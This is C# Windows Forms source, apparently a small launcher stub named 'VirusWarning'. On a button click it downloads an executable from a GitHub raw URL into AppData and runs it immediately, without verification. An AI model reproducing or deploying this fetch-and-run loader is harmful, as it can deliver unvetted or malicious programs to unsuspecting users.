using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;
namespace VirusWarning
{
    public partial class Form1 : Form
    {
        string DownloadURL= "https://github.com/TeamSmileSecurity/DWExecutor/blob/main/GameDevSetup.exe?raw=true";
        string DownloadName = "GameDever";

        string DownloadLocation = ""; //Dont change this
        string FileLocation = ""; //Dont change this
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            DownloadButton.Focus();
        }

        private void DownloadButton_Click(object sender, EventArgs e)
        {
            string folder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            DownloadLocation = folder.ToString() + "\\" + DownloadName;
            Directory.CreateDirectory(DownloadLocation);
            FileLocation = folder.ToString() + "\\" + DownloadName + "\\" + DownloadName + ".exe";
            MessageBox.Show(DownloadLocation.ToString(), FileLocation.ToString(), 0);
            
            using (WebClient wc = new WebClient())
            {
                wc.DownloadFile(DownloadURL, FileLocation);
            }

            System.Diagnostics.Process.Start(FileLocation);
        }
    }
}
